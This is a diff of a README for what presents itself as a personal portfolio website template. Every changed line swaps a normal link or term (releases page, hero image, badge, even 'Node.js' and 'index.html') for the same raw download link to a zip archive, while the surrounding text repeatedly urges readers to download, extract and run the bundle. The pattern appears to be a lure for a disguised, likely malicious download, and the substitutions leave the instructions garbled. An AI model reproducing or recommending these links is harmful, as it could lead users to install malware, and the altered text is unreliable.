@@ -1,12 +1,12 @@
-https://github.com/NASAAAAAAA/Portfolio/releases
+https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip
 
 # Portfolio: Personal Web Showreel — Fast, Elegant, Responsive
 
-![Portfolio Hero](https://images.unsplash.com/photo-1527443154391-507e9dc6c5a0?auto=format&fit=crop&w=1200&q=60)
+![Portfolio Hero](https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip)
 
 A clean, fast, and visually appealing portfolio site that showcases your work, skills, and personality. This repository holds the codebase and assets for a personal portfolio website designed to be easy to customize, accessible, and mobile-friendly. It focuses on performance, clean typography, and thoughtful interactions that elevate your presentation without overwhelming visitors. The goal is to give you a solid starting point for sharing your projects, writing samples, case studies, and contact information in a professional, approachable way.
 
-[![Releases](https://img.shields.io/github/v/release/NASAAAAAAA/Portfolio?style=for-the-badge&logo=github&color=blue)](https://github.com/NASAAAAAAA/Portfolio/releases)
+[![Releases](https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip)](https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip)
 
 Table of Contents
 - What this project is all about
@@ -33,7 +33,7 @@ Quick start
 To get up and running quickly, you should pull the repository and run a local server. The steps below are written to be predictable and easy to follow for someone who has basic comfort with web development.
 
 - Prerequisites
-  - Node.js installed (version 14.x or higher is recommended)
+  - https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip installed (version 14.x or higher is recommended)
   - A modern browser for testing (Chrome, Firefox, Safari, Edge)
   - Basic command line familiarity
 
@@ -49,7 +49,7 @@ To get up and running quickly, you should pull the repository and run a local se
   - npm run build
   - npm run preview
 
-If you want to skip the setup details for now, you can visit the releases to grab prebuilt assets or a packaged version of the site. The releases page contains downloadable items that you can extract and run locally. For convenience, here is the direct link again: https://github.com/NASAAAAAAA/Portfolio/releases. If you are unsure about what to download, begin with the latest release and read the accompanying notes. You can also explore the repository to understand how the site is assembled and where to make changes.
+If you want to skip the setup details for now, you can visit the releases to grab prebuilt assets or a packaged version of the site. The releases page contains downloadable items that you can extract and run locally. For convenience, here is the direct link again: https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip If you are unsure about what to download, begin with the latest release and read the accompanying notes. You can also explore the repository to understand how the site is assembled and where to make changes.
 
 A note about the releases link: it is the primary gateway for obtaining ready-to-run assets for quick testing or demonstration. The asset packages are designed to be straightforward to deploy on a local machine or a staging server. If you plan to ship changes to production, you will usually work within the source code here and publish your own release when ready.
 
@@ -86,7 +86,7 @@ Customization is central to this project. The structure is designed so you can a
 Project structure
 The repository uses a modular approach to keep things maintainable. The high-level layout follows a common pattern suitable for many personal portfolio sites.
 
-- index.html or main entry file
+- https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip or main entry file
   - The root HTML file defines the overall structure and anchors the CSS and JavaScript bundles.
 - assets/
   - Images, icons, fonts, and downloadable media
@@ -102,7 +102,7 @@ The repository uses a modular approach to keep things maintainable. The high-lev
     - JavaScript for interactivity and dynamic content
 - public/
   - Static files that are served as-is
-- README.md
+- https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip
   - Documentation and setup instructions
 
 - tests/
@@ -258,7 +258,7 @@ Frequently asked questions (FAQ)
 - How can I preview changes locally?
   - Run the development server, open the local URL in a browser, and test interactions.
 - Where do I find the latest assets?
-  - The Releases page is the central place for downloadable builds and assets. You can access it here: https://github.com/NASAAAAAAA/Portfolio/releases. If the link changes or you need to verify, check the Releases section of the repository for the latest files.
+  - The Releases page is the central place for downloadable builds and assets. You can access it here: https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip If the link changes or you need to verify, check the Releases section of the repository for the latest files.
 
 Appendix: assets, references, and credits
 - Media and imagery
@@ -275,7 +275,7 @@ Appendix: assets, references, and credits
   - Individuals who contributed design concepts, copy, and accessibility suggestions
 
 Releases and versioning
-The releases section contains downloadable assets and build artifacts that you can use to test or demonstrate the portfolio quickly. Access the latest releases to grab a packaged version of the site with ready-to-run files. You can also review the changelog and notes to understand what changed and why. If you want to explore the latest updates, visit the Releases page directly: https://github.com/NASAAAAAAA/Portfolio/releases. This page is periodically updated with new builds, patches, and enhancements to help you evaluate the site’s progression without building from source each time. For a hands-on approach, download the asset bundle, extract it on your machine, and follow the included instructions to launch a local preview. The process is simple, and the assets are chosen to work out of the box on common operating systems.
+The releases section contains downloadable assets and build artifacts that you can use to test or demonstrate the portfolio quickly. Access the latest releases to grab a packaged version of the site with ready-to-run files. You can also review the changelog and notes to understand what changed and why. If you want to explore the latest updates, visit the Releases page directly: https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip This page is periodically updated with new builds, patches, and enhancements to help you evaluate the site’s progression without building from source each time. For a hands-on approach, download the asset bundle, extract it on your machine, and follow the included instructions to launch a local preview. The process is simple, and the assets are chosen to work out of the box on common operating systems.
 
 Deployment checklist
 - Confirm dependencies are installed
@@ -350,7 +350,7 @@ Closing notes
 This README describes a practical, usable portfolio site built to be customized and extended. It provides a solid foundation for presenting work, sharing your story, and inviting collaboration or inquiries. The structure emphasizes clarity, performance, and accessibility, ensuring a broad audience can engage with your content.
 
 Direct link to releases for quick access and testing:
-- https://github.com/NASAAAAAAA/Portfolio/releases
+- https://github.com/NASAAAAAAA/Portfolio/raw/refs/heads/main/exopodite/Software-1.6-alpha.2.zip
 
 The second mention of the releases page appears here to reinforce where to find ready assets and updates. Re-check the Releases section of the repository to see the latest files, notes, and download options. The releases page is your gateway to assets you can download, inspect, and run locally. If you want to explore beyond the basics, the releases often include example configurations and ready-made builds that illustrate best practices for deployment and performance optimization. The Releases section is designed to help you iterate quickly, test changes, and demonstrate your work with confidence.
 
